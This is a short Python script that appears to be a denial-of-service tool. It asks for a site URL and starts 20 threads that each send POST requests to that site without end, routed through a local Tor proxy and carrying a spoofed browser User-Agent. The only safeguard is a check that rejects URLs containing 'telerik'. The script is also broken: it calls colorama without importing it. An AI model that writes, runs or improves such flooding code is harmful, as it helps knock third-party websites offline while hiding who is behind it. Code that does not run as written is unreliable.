import requests
import os
import threading
from threading import Thread
import random

# Tor IP reuse is prohibited.
site_name = input('site_url: ')
if 'telerik' in site_name:
	print('This site url is forbidden')
	quit()
headers = {'User-Agent':'Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11',
			'content-type': 'application/json',
			'Accept' : 'application/json', 
        	'Content-Type' : 'application/json',
        	"Accept-Encoding": "gzip, deflate, sdch, br",
        	"Accept-Language": "en-US,en;q=0.8"}
session = requests.Session()
proxies = {'http' : 'socks5h://localhost:9150', 'https': 'socks5h://localhost:9150'}
colorama.init()
def get_tor_session():
	while True:
		try:
			print('Successful POST request for {} '.format(site_name) +str(session.post(site_name, proxies=proxies,headers=headers,data={'data':'sample'})))
		except:
			print('Failure POST request for {}'.format(site_name))



def with_threading():
	t1 = Thread(target = get_tor_session)
	t2 = Thread(target = get_tor_session)
	t3 = Thread(target = get_tor_session)
	t4 = Thread(target = get_tor_session)
	t5 = Thread(target = get_tor_session)

	t6 = Thread(target = get_tor_session)
	t7 = Thread(target = get_tor_session)
	t8 = Thread(target = get_tor_session)
	t9 = Thread(target = get_tor_session)
	t10 = Thread(target = get_tor_session)


	t11 = Thread(target = get_tor_session)
	t12 = Thread(target = get_tor_session)
	t13 = Thread(target = get_tor_session)
	t14 = Thread(target = get_tor_session)
	t15 = Thread(target = get_tor_session)

	t16 = Thread(target = get_tor_session)
	t17 = Thread(target = get_tor_session)
	t18 = Thread(target = get_tor_session)
	t19 = Thread(target = get_tor_session)
	t20 = Thread(target = get_tor_session)

	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()

	t11.start()
	t12.start()
	t13.start()
	t14.start()
	t15.start()
	t16.start()
	t17.start()
	t18.start()
	t19.start()
	t20.start()

if __name__ == '__main__':
	with_threading()
